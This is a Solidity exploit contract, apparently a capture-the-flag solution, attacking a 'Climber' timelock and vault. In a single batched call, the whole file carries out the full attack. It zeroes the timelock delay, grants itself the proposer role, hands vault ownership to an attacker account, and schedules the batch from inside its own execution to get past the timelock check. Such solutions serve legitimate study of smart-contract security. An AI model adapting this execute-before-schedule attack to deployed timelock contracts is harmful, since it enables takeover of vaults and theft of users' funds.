// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

//import "@openzeppelin/contracts/access/AccessControl.sol";

interface IClimberTimelock {
    function schedule(address[] calldata targets, uint256[] calldata values, bytes[] calldata dataElements, bytes32 salt) external;
    function execute(address[] calldata targets, uint256[] calldata values, bytes[] calldata dataElements, bytes32 salt) external;
}

contract ClimberExploit {
    address public attackerEOA;
    address public timelockAddr;
    address public vaultAddr;

    address[] public targets;
    uint256[] public values;
    bytes[] public dataElements;

    bytes32 public constant PROPOSER_ROLE = keccak256("PROPOSER_ROLE");

    constructor (address _attackerEOA, address _timelockAddr, address _vaultAddr) {
        attackerEOA = _attackerEOA;
        timelockAddr = _timelockAddr;
        vaultAddr = _vaultAddr;
    }

    function exploit() external {
        // updateDelay set to 0 
        targets.push(timelockAddr);
        values.push(0);
        dataElements.push(abi.encodeWithSignature("updateDelay(uint64)", uint64(0)));

        // Granting the PROPOSER role to this attacker contract(ClimberExploit.sol)
        // AccessControl.sol
        targets.push(timelockAddr);
        values.push(0);
        dataElements.push(abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, address(this)));

        // Transfer ownership of Logic Contract(ClimberVault) to attacker EOA
        // OwnableUpgradeable.sol
        targets.push(vaultAddr);
        values.push(0);
        dataElements.push(abi.encodeWithSignature("transferOwnership(address)", attackerEOA));

        // to bypass schedule check
        targets.push(address(this));
        values.push(0);
        dataElements.push(abi.encodeWithSignature("triggerSchedule()"));

        // execute()
        IClimberTimelock(timelockAddr).execute(targets, values, dataElements, keccak256("salt"));
    }

    function triggerSchedule() external {
        // triggering VaultTimelock::schedule()
        IClimberTimelock(timelockAddr).schedule(targets, values, dataElements, keccak256("salt"));
    }
}